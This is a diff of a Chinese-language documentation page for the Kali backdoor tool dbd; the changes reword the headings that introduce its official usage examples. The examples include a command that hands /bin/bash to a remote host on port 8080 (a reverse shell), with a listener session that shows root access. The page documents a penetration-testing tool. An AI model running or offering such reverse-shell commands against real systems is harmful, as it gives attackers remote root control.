@@ -37,15 +37,15 @@ On the server, listen for a connection (-l) on port 8080 (-p8080), and display v
 
 ### `dbd`
 
-官方给出的调用示例：`dbd -r 2400 -D on -v -e /bin/bash 192.168.1.202 8080`
+> 官方示例调用：`dbd -r 2400 -D on -v -e /bin/bash 192.168.1.202 8080`
 
 ```text
 root@kali:~# dbd -r 2400 -D on -v -e /bin/bash 192.168.1.202 8080
 ```
 
-### `dbd（示例）`
+### `dbd -l -p8080 -v`
 
-官方给出的调用示例：`dbd -l -p8080 -v`
+> 官方示例调用：`dbd -l -p8080 -v`
 
 ```text
 root@kali:~# dbd -l -p8080 -v
@@ -56,9 +56,9 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### `dbd（示例）`
+### `dbd -h`
 
-官方给出的调用示例：`dbd -h`
+> 官方示例调用：`dbd -h`
 
 ```text
 root@kali:~# dbd -h
